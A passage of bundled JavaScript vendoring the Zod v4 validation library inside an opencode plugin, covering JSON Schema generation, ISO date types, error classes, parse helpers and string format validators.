              }
            }
            if (typeof multipleOf === "number")
              json2.multipleOf = multipleOf;
            break;
          }
          case "boolean": {
            const json2 = _json;
            json2.type = "boolean";
            break;
          }
          case "bigint": {
            if (this.unrepresentable === "throw") {
              throw new Error("BigInt cannot be represented in JSON Schema");
            }
            break;
          }
          case "symbol": {
            if (this.unrepresentable === "throw") {
              throw new Error("Symbols cannot be represented in JSON Schema");
            }
            break;
          }
          case "null": {
            if (this.target === "openapi-3.0") {
              _json.type = "string";
              _json.nullable = true;
              _json.enum = [null];
            } else
              _json.type = "null";
            break;
          }
          case "any": {
            break;
          }
          case "unknown": {
            break;
          }
          case "undefined": {
            if (this.unrepresentable === "throw") {
              throw new Error("Undefined cannot be represented in JSON Schema");
            }
            break;
          }
          case "void": {
            if (this.unrepresentable === "throw") {
              throw new Error("Void cannot be represented in JSON Schema");
            }
            break;
          }
          case "never": {
            _json.not = {};
            break;
          }
          case "date": {
            if (this.unrepresentable === "throw") {
              throw new Error("Date cannot be represented in JSON Schema");
            }
            break;
          }
          case "array": {
            const json2 = _json;
            const { minimum, maximum } = schema._zod.bag;
            if (typeof minimum === "number")
              json2.minItems = minimum;
            if (typeof maximum === "number")
              json2.maxItems = maximum;
            json2.type = "array";
            json2.items = this.process(def.element, { ...params, path: [...params.path, "items"] });
            break;
          }
          case "object": {
            const json2 = _json;
            json2.type = "object";
            json2.properties = {};
            const shape = def.shape;
            for (const key in shape) {
              json2.properties[key] = this.process(shape[key], {
                ...params,
                path: [...params.path, "properties", key]
              });
            }
            const allKeys = new Set(Object.keys(shape));
            const requiredKeys = new Set([...allKeys].filter((key) => {
              const v = def.shape[key]._zod;
              if (this.io === "input") {
                return v.optin === undefined;
              } else {
                return v.optout === undefined;
              }
            }));
            if (requiredKeys.size > 0) {
              json2.required = Array.from(requiredKeys);
            }
            if (def.catchall?._zod.def.type === "never") {
              json2.additionalProperties = false;
            } else if (!def.catchall) {
              if (this.io === "output")
                json2.additionalProperties = false;
            } else if (def.catchall) {
              json2.additionalProperties = this.process(def.catchall, {
                ...params,
                path: [...params.path, "additionalProperties"]
              });
            }
            break;
          }
          case "union": {
            const json2 = _json;
            const options = def.options.map((x, i) => this.process(x, {
              ...params,
              path: [...params.path, "anyOf", i]
            }));
            json2.anyOf = options;
            break;
          }
          case "intersection": {
            const json2 = _json;
            const a = this.process(def.left, {
              ...params,
              path: [...params.path, "allOf", 0]
            });
            const b = this.process(def.right, {
              ...params,
              path: [...params.path, "allOf", 1]
            });
            const isSimpleIntersection = (val) => ("allOf" in val) && Object.keys(val).length === 1;
            const allOf = [
              ...isSimpleIntersection(a) ? a.allOf : [a],
              ...isSimpleIntersection(b) ? b.allOf : [b]
            ];
            json2.allOf = allOf;
            break;
          }
          case "tuple": {
            const json2 = _json;
            json2.type = "array";
            const prefixPath = this.target === "draft-2020-12" ? "prefixItems" : "items";
            const restPath = this.target === "draft-2020-12" ? "items" : this.target === "openapi-3.0" ? "items" : "additionalItems";
            const prefixItems = def.items.map((x, i) => this.process(x, {
              ...params,
              path: [...params.path, prefixPath, i]
            }));
            const rest = def.rest ? this.process(def.rest, {
              ...params,
              path: [...params.path, restPath, ...this.target === "openapi-3.0" ? [def.items.length] : []]
            }) : null;
            if (this.target === "draft-2020-12") {
              json2.prefixItems = prefixItems;
              if (rest) {
                json2.items = rest;
              }
            } else if (this.target === "openapi-3.0") {
              json2.items = {
                anyOf: prefixItems
              };
              if (rest) {
                json2.items.anyOf.push(rest);
              }
              json2.minItems = prefixItems.length;
              if (!rest) {
                json2.maxItems = prefixItems.length;
              }
            } else {
              json2.items = prefixItems;
              if (rest) {
                json2.additionalItems = rest;
              }
            }
            const { minimum, maximum } = schema._zod.bag;
            if (typeof minimum === "number")
              json2.minItems = minimum;
            if (typeof maximum === "number")
              json2.maxItems = maximum;
            break;
          }
          case "record": {
            const json2 = _json;
            json2.type = "object";
            if (this.target === "draft-7" || this.target === "draft-2020-12") {
              json2.propertyNames = this.process(def.keyType, {
                ...params,
                path: [...params.path, "propertyNames"]
              });
            }
            json2.additionalProperties = this.process(def.valueType, {
              ...params,
              path: [...params.path, "additionalProperties"]
            });
            break;
          }
          case "map": {
            if (this.unrepresentable === "throw") {
              throw new Error("Map cannot be represented in JSON Schema");
            }
            break;
          }
          case "set": {
            if (this.unrepresentable === "throw") {
              throw new Error("Set cannot be represented in JSON Schema");
            }
            break;
          }
          case "enum": {
            const json2 = _json;
            const values = getEnumValues2(def.entries);
            if (values.every((v) => typeof v === "number"))
              json2.type = "number";
            if (values.every((v) => typeof v === "string"))
              json2.type = "string";
            json2.enum = values;
            break;
          }
          case "literal": {
            const json2 = _json;
            const vals = [];
            for (const val of def.values) {
              if (val === undefined) {
                if (this.unrepresentable === "throw") {
                  throw new Error("Literal `undefined` cannot be represented in JSON Schema");
                } else {}
              } else if (typeof val === "bigint") {
                if (this.unrepresentable === "throw") {
                  throw new Error("BigInt literals cannot be represented in JSON Schema");
                } else {
                  vals.push(Number(val));
                }
              } else {
                vals.push(val);
              }
            }
            if (vals.length === 0) {} else if (vals.length === 1) {
              const val = vals[0];
              json2.type = val === null ? "null" : typeof val;
              if (this.target === "draft-4" || this.target === "openapi-3.0") {
                json2.enum = [val];
              } else {
                json2.const = val;
              }
            } else {
              if (vals.every((v) => typeof v === "number"))
                json2.type = "number";
              if (vals.every((v) => typeof v === "string"))
                json2.type = "string";
              if (vals.every((v) => typeof v === "boolean"))
                json2.type = "string";
              if (vals.every((v) => v === null))
                json2.type = "null";
              json2.enum = vals;
            }
            break;
          }
          case "file": {
            const json2 = _json;
            const file2 = {
              type: "string",
              format: "binary",
              contentEncoding: "binary"
            };
            const { minimum, maximum, mime } = schema._zod.bag;
            if (minimum !== undefined)
              file2.minLength = minimum;
            if (maximum !== undefined)
              file2.maxLength = maximum;
            if (mime) {
              if (mime.length === 1) {
                file2.contentMediaType = mime[0];
                Object.assign(json2, file2);
              } else {
                json2.anyOf = mime.map((m) => {
                  const mFile = { ...file2, contentMediaType: m };
                  return mFile;
                });
              }
            } else {
              Object.assign(json2, file2);
            }
            break;
          }
          case "transform": {
            if (this.unrepresentable === "throw") {
              throw new Error("Transforms cannot be represented in JSON Schema");
            }
            break;
          }
          case "nullable": {
            const inner = this.process(def.innerType, params);
            if (this.target === "openapi-3.0") {
              result.ref = def.innerType;
              _json.nullable = true;
            } else {
              _json.anyOf = [inner, { type: "null" }];
            }
            break;
          }
          case "nonoptional": {
            this.process(def.innerType, params);
            result.ref = def.innerType;
            break;
          }
          case "success": {
            const json2 = _json;
            json2.type = "boolean";
            break;
          }
          case "default": {
            this.process(def.innerType, params);
            result.ref = def.innerType;
            _json.default = JSON.parse(JSON.stringify(def.defaultValue));
            break;
          }
          case "prefault": {
            this.process(def.innerType, params);
            result.ref = def.innerType;
            if (this.io === "input")
              _json._prefault = JSON.parse(JSON.stringify(def.defaultValue));
            break;
          }
          case "catch": {
            this.process(def.innerType, params);
            result.ref = def.innerType;
            let catchValue;
            try {
              catchValue = def.catchValue(undefined);
            } catch {
              throw new Error("Dynamic catch values are not supported in JSON Schema");
            }
            _json.default = catchValue;
            break;
          }
          case "nan": {
            if (this.unrepresentable === "throw") {
              throw new Error("NaN cannot be represented in JSON Schema");
            }
            break;
          }
          case "template_literal": {
            const json2 = _json;
            const pattern = schema._zod.pattern;
            if (!pattern)
              throw new Error("Pattern not found in template literal");
            json2.type = "string";
            json2.pattern = pattern.source;
            break;
          }
          case "pipe": {
            const innerType = this.io === "input" ? def.in._zod.def.type === "transform" ? def.out : def.in : def.out;
            this.process(innerType, params);
            result.ref = innerType;
            break;
          }
          case "readonly": {
            this.process(def.innerType, params);
            result.ref = def.innerType;
            _json.readOnly = true;
            break;
          }
          case "promise": {
            this.process(def.innerType, params);
            result.ref = def.innerType;
            break;
          }
          case "optional": {
            this.process(def.innerType, params);
            result.ref = def.innerType;
            break;
          }
          case "lazy": {
            const innerType = schema._zod.innerType;
            this.process(innerType, params);
            result.ref = innerType;
            break;
          }
          case "custom": {
            if (this.unrepresentable === "throw") {
              throw new Error("Custom types cannot be represented in JSON Schema");
            }
            break;
          }
          case "function": {
            if (this.unrepresentable === "throw") {
              throw new Error("Function types cannot be represented in JSON Schema");
            }
            break;
          }
          default: {}
        }
      }
    }
    const meta3 = this.metadataRegistry.get(schema);
    if (meta3)
      Object.assign(result.schema, meta3);
    if (this.io === "input" && isTransforming2(schema)) {
      delete result.schema.examples;
      delete result.schema.default;
    }
    if (this.io === "input" && result.schema._prefault)
      (_a2 = result.schema).default ?? (_a2.default = result.schema._prefault);
    delete result.schema._prefault;
    const _result = this.seen.get(schema);
    return _result.schema;
  }
  emit(schema, _params) {
    const params = {
      cycles: _params?.cycles ?? "ref",
      reused: _params?.reused ?? "inline",
      external: _params?.external ?? undefined
    };
    const root = this.seen.get(schema);
    if (!root)
      throw new Error("Unprocessed schema. This is a bug in Zod.");
    const makeURI = (entry) => {
      const defsSegment = this.target === "draft-2020-12" ? "$defs" : "definitions";
      if (params.external) {
        const externalId = params.external.registry.get(entry[0])?.id;
        const uriGenerator = params.external.uri ?? ((id2) => id2);
        if (externalId) {
          return { ref: uriGenerator(externalId) };
        }
        const id = entry[1].defId ?? entry[1].schema.id ?? `schema${this.counter++}`;
        entry[1].defId = id;
        return { defId: id, ref: `${uriGenerator("__shared")}#/${defsSegment}/${id}` };
      }
      if (entry[1] === root) {
        return { ref: "#" };
      }
      const uriPrefix = `#`;
      const defUriPrefix = `${uriPrefix}/${defsSegment}/`;
      const defId = entry[1].schema.id ?? `__schema${this.counter++}`;
      return { defId, ref: defUriPrefix + defId };
    };
    const extractToDef = (entry) => {
      if (entry[1].schema.$ref) {
        return;
      }
      const seen = entry[1];
      const { ref, defId } = makeURI(entry);
      seen.def = { ...seen.schema };
      if (defId)
        seen.defId = defId;
      const schema2 = seen.schema;
      for (const key in schema2) {
        delete schema2[key];
      }
      schema2.$ref = ref;
    };
    if (params.cycles === "throw") {
      for (const entry of this.seen.entries()) {
        const seen = entry[1];
        if (seen.cycle) {
          throw new Error("Cycle detected: " + `#/${seen.cycle?.join("/")}/<root>` + '\n\nSet the `cycles` parameter to `"ref"` to resolve cyclical schemas with defs.');
        }
      }
    }
    for (const entry of this.seen.entries()) {
      const seen = entry[1];
      if (schema === entry[0]) {
        extractToDef(entry);
        continue;
      }
      if (params.external) {
        const ext = params.external.registry.get(entry[0])?.id;
        if (schema !== entry[0] && ext) {
          extractToDef(entry);
          continue;
        }
      }
      const id = this.metadataRegistry.get(entry[0])?.id;
      if (id) {
        extractToDef(entry);
        continue;
      }
      if (seen.cycle) {
        extractToDef(entry);
        continue;
      }
      if (seen.count > 1) {
        if (params.reused === "ref") {
          extractToDef(entry);
          continue;
        }
      }
    }
    const flattenRef = (zodSchema, params2) => {
      const seen = this.seen.get(zodSchema);
      const schema2 = seen.def ?? seen.schema;
      const _cached = { ...schema2 };
      if (seen.ref === null) {
        return;
      }
      const ref = seen.ref;
      seen.ref = null;
      if (ref) {
        flattenRef(ref, params2);
        const refSchema = this.seen.get(ref).schema;
        if (refSchema.$ref && (params2.target === "draft-7" || params2.target === "draft-4" || params2.target === "openapi-3.0")) {
          schema2.allOf = schema2.allOf ?? [];
          schema2.allOf.push(refSchema);
        } else {
          Object.assign(schema2, refSchema);
          Object.assign(schema2, _cached);
        }
      }
      if (!seen.isParent)
        this.override({
          zodSchema,
          jsonSchema: schema2,
          path: seen.path ?? []
        });
    };
    for (const entry of [...this.seen.entries()].reverse()) {
      flattenRef(entry[0], { target: this.target });
    }
    const result = {};
    if (this.target === "draft-2020-12") {
      result.$schema = "https://json-schema.org/draft/2020-12/schema";
    } else if (this.target === "draft-7") {
      result.$schema = "http://json-schema.org/draft-07/schema#";
    } else if (this.target === "draft-4") {
      result.$schema = "http://json-schema.org/draft-04/schema#";
    } else if (this.target === "openapi-3.0") {} else {
      console.warn(`Invalid target: ${this.target}`);
    }
    if (params.external?.uri) {
      const id = params.external.registry.get(schema)?.id;
      if (!id)
        throw new Error("Schema is missing an `id` property");
      result.$id = params.external.uri(id);
    }
    Object.assign(result, root.def);
    const defs = params.external?.defs ?? {};
    for (const entry of this.seen.entries()) {
      const seen = entry[1];
      if (seen.def && seen.defId) {
        defs[seen.defId] = seen.def;
      }
    }
    if (params.external) {} else {
      if (Object.keys(defs).length > 0) {
        if (this.target === "draft-2020-12") {
          result.$defs = defs;
        } else {
          result.definitions = defs;
        }
      }
    }
    try {
      return JSON.parse(JSON.stringify(result));
    } catch (_err) {
      throw new Error("Error converting schema to JSON.");
    }
  }
}
function toJSONSchema2(input, _params) {
  if (input instanceof $ZodRegistry2) {
    const gen2 = new JSONSchemaGenerator2(_params);
    const defs = {};
    for (const entry of input._idmap.entries()) {
      const [_, schema] = entry;
      gen2.process(schema);
    }
    const schemas3 = {};
    const external2 = {
      registry: input,
      uri: _params?.uri,
      defs
    };
    for (const entry of input._idmap.entries()) {
      const [key, schema] = entry;
      schemas3[key] = gen2.emit(schema, {
        ..._params,
        external: external2
      });
    }
    if (Object.keys(defs).length > 0) {
      const defsSegment = gen2.target === "draft-2020-12" ? "$defs" : "definitions";
      schemas3.__shared = {
        [defsSegment]: defs
      };
    }
    return { schemas: schemas3 };
  }
  const gen = new JSONSchemaGenerator2(_params);
  gen.process(input);
  return gen.emit(input, _params);
}
function isTransforming2(_schema, _ctx) {
  const ctx = _ctx ?? { seen: new Set };
  if (ctx.seen.has(_schema))
    return false;
  ctx.seen.add(_schema);
  const schema = _schema;
  const def = schema._zod.def;
  switch (def.type) {
    case "string":
    case "number":
    case "bigint":
    case "boolean":
    case "date":
    case "symbol":
    case "undefined":
    case "null":
    case "any":
    case "unknown":
    case "never":
    case "void":
    case "literal":
    case "enum":
    case "nan":
    case "file":
    case "template_literal":
      return false;
    case "array": {
      return isTransforming2(def.element, ctx);
    }
    case "object": {
      for (const key in def.shape) {
        if (isTransforming2(def.shape[key], ctx))
          return true;
      }
      return false;
    }
    case "union": {
      for (const option of def.options) {
        if (isTransforming2(option, ctx))
          return true;
      }
      return false;
    }
    case "intersection": {
      return isTransforming2(def.left, ctx) || isTransforming2(def.right, ctx);
    }
    case "tuple": {
      for (const item of def.items) {
        if (isTransforming2(item, ctx))
          return true;
      }
      if (def.rest && isTransforming2(def.rest, ctx))
        return true;
      return false;
    }
    case "record": {
      return isTransforming2(def.keyType, ctx) || isTransforming2(def.valueType, ctx);
    }
    case "map": {
      return isTransforming2(def.keyType, ctx) || isTransforming2(def.valueType, ctx);
    }
    case "set": {
      return isTransforming2(def.valueType, ctx);
    }
    case "promise":
    case "optional":
    case "nonoptional":
    case "nullable":
    case "readonly":
      return isTransforming2(def.innerType, ctx);
    case "lazy":
      return isTransforming2(def.getter(), ctx);
    case "default": {
      return isTransforming2(def.innerType, ctx);
    }
    case "prefault": {
      return isTransforming2(def.innerType, ctx);
    }
    case "custom": {
      return false;
    }
    case "transform": {
      return true;
    }
    case "pipe": {
      return isTransforming2(def.in, ctx) || isTransforming2(def.out, ctx);
    }
    case "success": {
      return false;
    }
    case "catch": {
      return false;
    }
    case "function": {
      return false;
    }
    default:
  }
  throw new Error(`Unknown schema type: ${def.type}`);
}
// node_modules/@opencode-ai/plugin/node_modules/zod/v4/core/json-schema.js
var exports_json_schema2 = {};
// node_modules/@opencode-ai/plugin/node_modules/zod/v4/classic/iso.js
var exports_iso2 = {};
__export(exports_iso2, {
  time: () => time4,
  duration: () => duration4,
  datetime: () => datetime4,
  date: () => date6,
  ZodISOTime: () => ZodISOTime2,
  ZodISODuration: () => ZodISODuration2,
  ZodISODateTime: () => ZodISODateTime2,
  ZodISODate: () => ZodISODate2
});
var ZodISODateTime2 = /* @__PURE__ */ $constructor2("ZodISODateTime", (inst, def) => {
  $ZodISODateTime2.init(inst, def);
  ZodStringFormat2.init(inst, def);
});
function datetime4(params) {
  return _isoDateTime2(ZodISODateTime2, params);
}
var ZodISODate2 = /* @__PURE__ */ $constructor2("ZodISODate", (inst, def) => {
  $ZodISODate2.init(inst, def);
  ZodStringFormat2.init(inst, def);
});
function date6(params) {
  return _isoDate2(ZodISODate2, params);
}
var ZodISOTime2 = /* @__PURE__ */ $constructor2("ZodISOTime", (inst, def) => {
  $ZodISOTime2.init(inst, def);
  ZodStringFormat2.init(inst, def);
});
function time4(params) {
  return _isoTime2(ZodISOTime2, params);
}
var ZodISODuration2 = /* @__PURE__ */ $constructor2("ZodISODuration", (inst, def) => {
  $ZodISODuration2.init(inst, def);
  ZodStringFormat2.init(inst, def);
});
function duration4(params) {
  return _isoDuration2(ZodISODuration2, params);
}

// node_modules/@opencode-ai/plugin/node_modules/zod/v4/classic/errors.js
var initializer4 = (inst, issues) => {
  $ZodError2.init(inst, issues);
  inst.name = "ZodError";
  Object.defineProperties(inst, {
    format: {
      value: (mapper) => formatError2(inst, mapper)
    },
    flatten: {
      value: (mapper) => flattenError2(inst, mapper)
    },
    addIssue: {
      value: (issue3) => {
        inst.issues.push(issue3);
        inst.message = JSON.stringify(inst.issues, jsonStringifyReplacer2, 2);
      }
    },
    addIssues: {
      value: (issues2) => {
        inst.issues.push(...issues2);
        inst.message = JSON.stringify(inst.issues, jsonStringifyReplacer2, 2);
      }
    },
    isEmpty: {
      get() {
        return inst.issues.length === 0;
      }
    }
  });
};
var ZodError2 = $constructor2("ZodError", initializer4);
var ZodRealError2 = $constructor2("ZodError", initializer4, {
  Parent: Error
});

// node_modules/@opencode-ai/plugin/node_modules/zod/v4/classic/parse.js
var parse7 = /* @__PURE__ */ _parse2(ZodRealError2);
var parseAsync4 = /* @__PURE__ */ _parseAsync2(ZodRealError2);
var safeParse4 = /* @__PURE__ */ _safeParse2(ZodRealError2);
var safeParseAsync4 = /* @__PURE__ */ _safeParseAsync2(ZodRealError2);
var encode4 = /* @__PURE__ */ _encode2(ZodRealError2);
var decode4 = /* @__PURE__ */ _decode2(ZodRealError2);
var encodeAsync4 = /* @__PURE__ */ _encodeAsync2(ZodRealError2);
var decodeAsync4 = /* @__PURE__ */ _decodeAsync2(ZodRealError2);
var safeEncode4 = /* @__PURE__ */ _safeEncode2(ZodRealError2);
var safeDecode4 = /* @__PURE__ */ _safeDecode2(ZodRealError2);
var safeEncodeAsync4 = /* @__PURE__ */ _safeEncodeAsync2(ZodRealError2);
var safeDecodeAsync4 = /* @__PURE__ */ _safeDecodeAsync2(ZodRealError2);

// node_modules/@opencode-ai/plugin/node_modules/zod/v4/classic/schemas.js
var ZodType2 = /* @__PURE__ */ $constructor2("ZodType", (inst, def) => {
  $ZodType2.init(inst, def);
  inst.def = def;
  inst.type = def.type;
  Object.defineProperty(inst, "_def", { value: def });
  inst.check = (...checks4) => {
    return inst.clone({
      ...def,
      checks: [
        ...def.checks ?? [],
        ...checks4.map((ch) => typeof ch === "function" ? { _zod: { check: ch, def: { check: "custom" }, onattach: [] } } : ch)
      ]
    });
  };
  inst.clone = (def2, params) => clone2(inst, def2, params);
  inst.brand = () => inst;
  inst.register = (reg, meta3) => {
    reg.add(inst, meta3);
    return inst;
  };
  inst.parse = (data, params) => parse7(inst, data, params, { callee: inst.parse });
  inst.safeParse = (data, params) => safeParse4(inst, data, params);
  inst.parseAsync = async (data, params) => parseAsync4(inst, data, params, { callee: inst.parseAsync });
  inst.safeParseAsync = async (data, params) => safeParseAsync4(inst, data, params);
  inst.spa = inst.safeParseAsync;
  inst.encode = (data, params) => encode4(inst, data, params);
  inst.decode = (data, params) => decode4(inst, data, params);
  inst.encodeAsync = async (data, params) => encodeAsync4(inst, data, params);
  inst.decodeAsync = async (data, params) => decodeAsync4(inst, data, params);
  inst.safeEncode = (data, params) => safeEncode4(inst, data, params);
  inst.safeDecode = (data, params) => safeDecode4(inst, data, params);
  inst.safeEncodeAsync = async (data, params) => safeEncodeAsync4(inst, data, params);
  inst.safeDecodeAsync = async (data, params) => safeDecodeAsync4(inst, data, params);
  inst.refine = (check2, params) => inst.check(refine2(check2, params));
  inst.superRefine = (refinement) => inst.check(superRefine2(refinement));
  inst.overwrite = (fn) => inst.check(_overwrite2(fn));
  inst.optional = () => optional2(inst);
  inst.nullable = () => nullable2(inst);
  inst.nullish = () => optional2(nullable2(inst));
  inst.nonoptional = (params) => nonoptional2(inst, params);
  inst.array = () => array2(inst);
  inst.or = (arg) => union2([inst, arg]);
  inst.and = (arg) => intersection2(inst, arg);
  inst.transform = (tx) => pipe2(inst, transform2(tx));
  inst.default = (def2) => _default4(inst, def2);
  inst.prefault = (def2) => prefault2(inst, def2);
  inst.catch = (params) => _catch4(inst, params);
  inst.pipe = (target) => pipe2(inst, target);
  inst.readonly = () => readonly2(inst);
  inst.describe = (description) => {
    const cl = inst.clone();
    globalRegistry2.add(cl, { description });
    return cl;
  };
  Object.defineProperty(inst, "description", {
    get() {
      return globalRegistry2.get(inst)?.description;
    },
    configurable: true
  });
  inst.meta = (...args) => {
    if (args.length === 0) {
      return globalRegistry2.get(inst);
    }
    const cl = inst.clone();
    globalRegistry2.add(cl, args[0]);
    return cl;
  };
  inst.isOptional = () => inst.safeParse(undefined).success;
  inst.isNullable = () => inst.safeParse(null).success;
  return inst;
});
var _ZodString2 = /* @__PURE__ */ $constructor2("_ZodString", (inst, def) => {
  $ZodString2.init(inst, def);
  ZodType2.init(inst, def);
  const bag = inst._zod.bag;
  inst.format = bag.format ?? null;
  inst.minLength = bag.minimum ?? null;
  inst.maxLength = bag.maximum ?? null;
  inst.regex = (...args) => inst.check(_regex2(...args));
  inst.includes = (...args) => inst.check(_includes2(...args));
  inst.startsWith = (...args) => inst.check(_startsWith2(...args));
  inst.endsWith = (...args) => inst.check(_endsWith2(...args));
  inst.min = (...args) => inst.check(_minLength2(...args));
  inst.max = (...args) => inst.check(_maxLength2(...args));
  inst.length = (...args) => inst.check(_length2(...args));
  inst.nonempty = (...args) => inst.check(_minLength2(1, ...args));
  inst.lowercase = (params) => inst.check(_lowercase2(params));
  inst.uppercase = (params) => inst.check(_uppercase2(params));
  inst.trim = () => inst.check(_trim2());
  inst.normalize = (...args) => inst.check(_normalize2(...args));
  inst.toLowerCase = () => inst.check(_toLowerCase2());
  inst.toUpperCase = () => inst.check(_toUpperCase2());
});
var ZodString2 = /* @__PURE__ */ $constructor2("ZodString", (inst, def) => {
  $ZodString2.init(inst, def);
  _ZodString2.init(inst, def);
  inst.email = (params) => inst.check(_email2(ZodEmail2, params));
  inst.url = (params) => inst.check(_url2(ZodURL2, params));
  inst.jwt = (params) => inst.check(_jwt2(ZodJWT2, params));
  inst.emoji = (params) => inst.check(_emoji4(ZodEmoji2, params));
  inst.guid = (params) => inst.check(_guid2(ZodGUID2, params));
  inst.uuid = (params) => inst.check(_uuid2(ZodUUID2, params));
  inst.uuidv4 = (params) => inst.check(_uuidv42(ZodUUID2, params));
  inst.uuidv6 = (params) => inst.check(_uuidv62(ZodUUID2, params));
  inst.uuidv7 = (params) => inst.check(_uuidv72(ZodUUID2, params));
  inst.nanoid = (params) => inst.check(_nanoid2(ZodNanoID2, params));
  inst.guid = (params) => inst.check(_guid2(ZodGUID2, params));
  inst.cuid = (params) => inst.check(_cuid3(ZodCUID3, params));
  inst.cuid2 = (params) => inst.check(_cuid22(ZodCUID22, params));
  inst.ulid = (params) => inst.check(_ulid2(ZodULID2, params));
  inst.base64 = (params) => inst.check(_base642(ZodBase642, params));
  inst.base64url = (params) => inst.check(_base64url2(ZodBase64URL2, params));
  inst.xid = (params) => inst.check(_xid2(ZodXID2, params));
  inst.ksuid = (params) => inst.check(_ksuid2(ZodKSUID2, params));
  inst.ipv4 = (params) => inst.check(_ipv42(ZodIPv42, params));
  inst.ipv6 = (params) => inst.check(_ipv62(ZodIPv62, params));
  inst.cidrv4 = (params) => inst.check(_cidrv42(ZodCIDRv42, params));
  inst.cidrv6 = (params) => inst.check(_cidrv62(ZodCIDRv62, params));
  inst.e164 = (params) => inst.check(_e1642(ZodE1642, params));
  inst.datetime = (params) => inst.check(datetime4(params));
  inst.date = (params) => inst.check(date6(params));
  inst.time = (params) => inst.check(time4(params));
  inst.duration = (params) => inst.check(duration4(params));
});
function string5(params) {
  return _string2(ZodString2, params);
}
var ZodStringFormat2 = /* @__PURE__ */ $constructor2("ZodStringFormat", (inst, def) => {
  $ZodStringFormat2.init(inst, def);
  _ZodString2.init(inst, def);
});
var ZodEmail2 = /* @__PURE__ */ $constructor2("ZodEmail", (inst, def) => {
  $ZodEmail2.init(inst, def);
  ZodStringFormat2.init(inst, def);
});
function email4(params) {
  return _email2(ZodEmail2, params);
}
var ZodGUID2 = /* @__PURE__ */ $constructor2("ZodGUID", (inst, def) => {
  $ZodGUID2.init(inst, def);
  ZodStringFormat2.init(inst, def);
});
function guid4(params) {
  return _guid2(ZodGUID2, params);
}
var ZodUUID2 = /* @__PURE__ */ $constructor2("ZodUUID", (inst, def) => {
  $ZodUUID2.init(inst, def);
  ZodStringFormat2.init(inst, def);
});
function uuid5(params) {
  return _uuid2(ZodUUID2, params);
}
function uuidv42(params) {
  return _uuidv42(ZodUUID2, params);
}
function uuidv62(params) {
  return _uuidv62(ZodUUID2, params);
}
function uuidv72(params) {
  return _uuidv72(ZodUUID2, params);
}
var ZodURL2 = /* @__PURE__ */ $constructor2("ZodURL", (inst, def) => {
  $ZodURL2.init(inst, def);
  ZodStringFormat2.init(inst, def);
});
function url2(params) {
  return _url2(ZodURL2, params);
}
function httpUrl2(params) {
  return _url2(ZodURL2, {
    protocol: /^https?$/,
    hostname: exports_regexes2.domain,
    ...exports_util2.normalizeParams(params)
  });
}
var ZodEmoji2 = /* @__PURE__ */ $constructor2("ZodEmoji", (inst, def) => {
  $ZodEmoji2.init(inst, def);
  ZodStringFormat2.init(inst, def);
});
function emoji4(params) {
  return _emoji4(ZodEmoji2, params);
}
var ZodNanoID2 = /* @__PURE__ */ $constructor2("ZodNanoID", (inst, def) => {
  $ZodNanoID2.init(inst, def);
  ZodStringFormat2.init(inst, def);
});
function nanoid4(params) {
  return _nanoid2(ZodNanoID2, params);
}
var ZodCUID3 = /* @__PURE__ */ $constructor2("ZodCUID", (inst, def) => {
  $ZodCUID3.init(inst, def);
  ZodStringFormat2.init(inst, def);
});
function cuid6(params) {
  return _cuid3(ZodCUID3, params);
}
var ZodCUID22 = /* @__PURE__ */ $constructor2("ZodCUID2", (inst, def) => {
  $ZodCUID22.init(inst, def);
  ZodStringFormat2.init(inst, def);
});
function cuid24(params) {
  return _cuid22(ZodCUID22, params);
}
var ZodULID2 = /* @__PURE__ */ $constructor2("ZodULID", (inst, def) => {
  $ZodULID2.init(inst, def);
  ZodStringFormat2.init(inst, def);
});
function ulid4(params) {
  return _ulid2(ZodULID2, params);
}
var ZodXID2 = /* @__PURE__ */ $constructor2("ZodXID", (inst, def) => {
  $ZodXID2.init(inst, def);
  ZodStringFormat2.init(inst, def);
});
function xid4(params) {
  return _xid2(ZodXID2, params);
}
var ZodKSUID2 = /* @__PURE__ */ $constructor2("ZodKSUID", (inst, def) => {
  $ZodKSUID2.init(inst, def);
  ZodStringFormat2.init(inst, def);
});
function ksuid4(params) {
  return _ksuid2(ZodKSUID2, params);
}
var ZodIPv42 = /* @__PURE__ */ $constructor2("ZodIPv4", (inst, def) => {
  $ZodIPv42.init(inst, def);
  ZodStringFormat2.init(inst, def);
});
function ipv44(params) {
  return _ipv42(ZodIPv42, params);
}
var ZodIPv62 = /* @__PURE__ */ $constructor2("ZodIPv6", (inst, def) => {
  $ZodIPv62.init(inst, def);
  ZodStringFormat2.init(inst, def);
});
function ipv64(params) {
  return _ipv62(ZodIPv62, params);
}
var ZodCIDRv42 = /* @__PURE__ */ $constructor2("ZodCIDRv4", (inst, def) => {
  $ZodCIDRv42.init(inst, def);
  ZodStringFormat2.init(inst, def);
});
function cidrv44(params) {
  return _cidrv42(ZodCIDRv42, params);
}
var ZodCIDRv62 = /* @__PURE__ */ $constructor2("ZodCIDRv6", (inst, def) => {
  $ZodCIDRv62.init(inst, def);
  ZodStringFormat2.init(inst, def);
});
function cidrv64(params) {
  return _cidrv62(ZodCIDRv62, params);
}
var ZodBase642 = /* @__PURE__ */ $constructor2("ZodBase64", (inst, def) => {
  $ZodBase642.init(inst, def);
  ZodStringFormat2.init(inst, def);
});
function base644(params) {
  return _base642(ZodBase642, params);
}
var ZodBase64URL2 = /* @__PURE__ */ $constructor2("ZodBase64URL", (inst, def) => {
  $ZodBase64URL2.init(inst, def);
  ZodStringFormat2.init(inst, def);
});
function base64url4(params) {
  return _base64url2(ZodBase64URL2, params);
}
var ZodE1642 = /* @__PURE__ */ $constructor2("ZodE164", (inst, def) => {
  $ZodE1642.init(inst, def);
  ZodStringFormat2.init(inst, def);
});
function e1644(params) {
  return _e1642(ZodE1642, params);
}
var ZodJWT2 = /* @__PURE__ */ $constructor2("ZodJWT", (inst, def) => {
  $ZodJWT2.init(inst, def);
  ZodStringFormat2.init(inst, def);
});
function jwt2(params) {
  return _jwt2(ZodJWT2, params);
}
var ZodCustomStringFormat2 = /* @__PURE__ */ $constructor2("ZodCustomStringFormat", (inst, def) => {
  $ZodCustomStringFormat2.init(inst, def);
  ZodStringFormat2.init(inst, def);
});
function stringFormat2(format, fnOrRegex, _params = {}) {
  return _stringFormat2(ZodCustomStringFormat2, format, fnOrRegex, _params);
}
function hostname4(_params) {
  return _stringFormat2(ZodCustomStringFormat2, "hostname", exports_regexes2.hostname, _params);
}
function hex4(_params) {
  return _stringFormat2(ZodCustomStringFormat2, "hex", exports_regexes2.hex, _params);
}
function hash2(alg, params) {
  const enc = params?.enc ?? "hex";
  const format = `${alg}_${enc}`;
  const regex = exports_regexes2[format];
  if (!regex)
    throw new Error(`Unrecognized hash format: ${format}`);
